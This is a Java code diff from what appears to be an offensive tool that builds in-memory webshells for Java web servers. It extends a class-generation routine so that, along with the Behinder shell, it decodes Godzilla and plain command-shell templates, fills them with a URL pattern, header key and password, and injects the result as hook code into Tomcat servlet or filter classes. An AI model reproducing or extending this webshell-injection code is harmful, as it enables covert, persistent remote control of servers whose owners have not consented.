@@ -196,25 +196,33 @@ public class GlassHandler {
 
 	public static void prepareClassModifier(CtClass templateClass, String hookType, String args) throws Exception {
 		CtClass classModifier = POOL.get(searchClassByName("ClassModifier"));
+		String  shell         = "";
 
 		// 插入 Hook 点
 		if (hookType.equals("Servlet")) {
 			// 插入 Hook Class 基本信息
 			insertInitHookClassINFORMATION(classModifier, BasicServletHook);
-		}else if (hookType.equals("Filter")){
+		} else if (hookType.equals("Filter")) {
 			insertInitHookClassINFORMATION(classModifier, TomcatFilterChainHook);
 		}
 
 		// 如果是冰蝎逻辑
 		if (args.equals("bx")) {
-
-			// 替换关键信息
-			String shell = base64Decode(BEHINDER_SHELL_FOR_AGENT);
+			shell = base64Decode(BEHINDER_SHELL_FOR_AGENT);
 			shell = String.format(shell, URL_PATTERN.substring(1), HEADER_KEY, HEADER_VALUE, PASSWORD);
-
-			// 替换密码，添加 Shell Code
-			insertField(classModifier, "HOOK_METHOD_CODE", "public static String HOOK_METHOD_CODE = \"" + base64Encode(shell.getBytes()) + "\";");
+		} else if (args.equals("gz")) {
+			shell = base64Decode(GODZILLA_SHELL_FOR_AGENT);
+			shell = String.format(shell, URL_PATTERN.substring(1), HEADER_KEY, HEADER_VALUE, PASSWORD_ORI, GODZILLA_KEY);
+		} else if (args.equals("gzraw")) {
+			shell = base64Decode(GODZILLA_RAW_FOR_AGENT);
+			shell = String.format(shell, URL_PATTERN.substring(1), HEADER_KEY, HEADER_VALUE, GODZILLA_KEY);
+		} else {
+			// 默认 cmd 逻辑
+			shell = base64Decode(CMD_SHELL_FOR_AGENT);
+			shell = String.format(shell, URL_PATTERN.substring(1), HEADER_KEY, HEADER_VALUE, CMD_HEADER_STRING);
 		}
+		// 替换密码，添加 Shell Code
+		insertField(classModifier, "HOOK_METHOD_CODE", "public static String HOOK_METHOD_CODE = \"" + base64Encode(shell.getBytes()) + "\";");
 
 		shrinkBytes(classModifier);
 		classModifier.setName(generateClassName());
